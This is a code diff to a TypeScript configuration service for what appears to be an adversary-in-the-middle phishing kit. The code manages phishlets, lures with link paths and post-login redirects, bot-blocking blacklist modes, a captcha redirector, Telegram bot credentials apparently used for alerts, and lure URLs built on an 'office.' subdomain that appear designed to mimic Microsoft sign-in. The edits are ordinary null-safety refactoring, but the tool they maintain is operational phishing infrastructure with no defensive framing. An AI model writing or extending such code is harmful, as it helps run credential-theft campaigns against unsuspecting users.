@@ -3,6 +3,7 @@ import * as path from "path";
 import chokidar, { FSWatcher } from "chokidar";
 import type { Config } from "../types";
 
+/* eslint-disable @typescript-eslint/no-unused-vars */
 /**
  * Phishlet interface representing phishlet configuration
  * Used in configuration parsing
@@ -33,6 +34,7 @@ interface Lure {
   redirector: string;
   ua_filter: string;
 }
+/* eslint-enable @typescript-eslint/no-unused-vars */
 
 export class ConfigService {
   private configPath: string;
@@ -246,8 +248,11 @@ export class ConfigService {
       const config = await this.readConfig();
       if (!config) return null;
 
-      const domain = config.general.domain;
-      const path = (config.lures && config.lures[0]?.path) || "";
+      // Add null checks for all properties
+      const general = config.general || {};
+      const domain = general.domain || "";
+      const lures = config.lures || [];
+      const path = lures[0]?.path || "";
       const fullUrl = domain ? `https://office.${domain}${path}` : "";
 
       return {
@@ -278,13 +283,33 @@ export class ConfigService {
   ): Promise<boolean> {
     try {
       const config = await this.readConfig();
-      if (!config) throw new Error("Failed to read config");
+      if (!config) {
+        // Create a complete config object
+        const newConfig: Config = {
+          general: {
+            telegram_bot_token: botToken,
+            telegram_chat_id: chatId,
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: "",
+          },
+          blacklist: { mode: "off" },
+          phishlets: {},
+          lures: [],
+        };
 
-      config.general = {
-        ...config.general,
-        telegram_bot_token: botToken,
-        telegram_chat_id: chatId,
-      };
+        return await this.writeConfig(newConfig);
+      }
+
+      // Ensure general object exists
+      config.general = config.general || {};
+
+      config.general.telegram_bot_token = botToken;
+      config.general.telegram_chat_id = chatId;
 
       return await this.writeConfig(config);
     } catch (error) {
@@ -296,12 +321,32 @@ export class ConfigService {
   public async updateBlacklistMode(blockBots: boolean): Promise<boolean> {
     try {
       const config = await this.readConfig();
-      if (!config) throw new Error("Failed to read config");
+      if (!config) {
+        // Create a complete config object
+        const newConfig: Config = {
+          blacklist: { mode: blockBots ? "unauth" : "off" },
+          general: {
+            telegram_bot_token: "",
+            telegram_chat_id: "",
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: "",
+          },
+          phishlets: {},
+          lures: [],
+        };
 
-      config.blacklist = {
-        ...config.blacklist,
-        mode: blockBots ? "unauth" : "off",
-      };
+        return await this.writeConfig(newConfig);
+      }
+
+      // Ensure blacklist object exists
+      config.blacklist = config.blacklist || {};
+
+      config.blacklist.mode = blockBots ? "unauth" : "off";
 
       return await this.writeConfig(config);
     } catch (error) {
@@ -313,12 +358,32 @@ export class ConfigService {
   public async updateRedirectUrl(url: string): Promise<boolean> {
     try {
       const config = await this.readConfig();
-      if (!config) throw new Error("Failed to read config");
+      if (!config) {
+        // Create a complete config object
+        const newConfig: Config = {
+          general: {
+            telegram_bot_token: "",
+            telegram_chat_id: "",
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: url,
+          },
+          blacklist: { mode: "off" },
+          phishlets: {},
+          lures: [],
+        };
 
-      config.general = {
-        ...config.general,
-        unauth_url: url,
-      };
+        return await this.writeConfig(newConfig);
+      }
+
+      // Ensure general object exists
+      config.general = config.general || {};
+
+      config.general.unauth_url = url;
 
       return await this.writeConfig(config);
     } catch (error) {
@@ -334,35 +399,78 @@ export class ConfigService {
   ): Promise<boolean> {
     try {
       const config = await this.readConfig();
-      if (!config) throw new Error("Failed to read config");
+      if (!config) {
+        // Process the linkPath to ensure proper format
+        const formattedPath = `/${linkPath.replace(/^\/+/, "")}`;
 
-      // Update lures array if it exists
-      if (config.lures && config.lures.length > 0) {
+        // Create a complete config object
+        const newConfig: Config = {
+          lures: [
+            {
+              hostname: "",
+              id: "",
+              info: "",
+              og_desc: "",
+              og_image: "",
+              og_title: "",
+              og_url: "",
+              path: formattedPath,
+              paused: 0,
+              phishlet: "001",
+              redirect_url: afterLoginRedirect,
+              redirector: useCaptcha ? "main" : "",
+              ua_filter: "",
+            },
+          ],
+          general: {
+            telegram_bot_token: "",
+            telegram_chat_id: "",
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: "",
+          },
+          blacklist: { mode: "off" },
+          phishlets: {},
+        };
+
+        return await this.writeConfig(newConfig);
+      }
+
+      // Ensure lures array exists
+      config.lures = config.lures || [];
+
+      // Process the linkPath to ensure proper format
+      const formattedPath = `/${linkPath.replace(/^\/+/, "")}`;
+
+      if (config.lures.length > 0) {
+        // Update existing lures
         config.lures = config.lures.map((lure) => ({
           ...lure,
           redirect_url: afterLoginRedirect,
           redirector: useCaptcha ? "main" : "",
-          path: `/${linkPath.replace(/^\/+/, "")}`, // Ensure single leading slash
+          path: formattedPath,
         }));
       } else {
         // Create a default lure if none exists
-        config.lures = [
-          {
-            hostname: "",
-            id: "",
-            info: "",
-            og_desc: "",
-            og_image: "",
-            og_title: "",
-            og_url: "",
-            path: `/${linkPath.replace(/^\/+/, "")}`,
-            paused: 0,
-            phishlet: "001",
-            redirect_url: afterLoginRedirect,
-            redirector: useCaptcha ? "main" : "",
-            ua_filter: "",
-          },
-        ];
+        config.lures.push({
+          hostname: "",
+          id: "",
+          info: "",
+          og_desc: "",
+          og_image: "",
+          og_title: "",
+          og_url: "",
+          path: formattedPath,
+          paused: 0,
+          phishlet: "001",
+          redirect_url: afterLoginRedirect,
+          redirector: useCaptcha ? "main" : "",
+          ua_filter: "",
+        });
       }
 
       return await this.writeConfig(config);
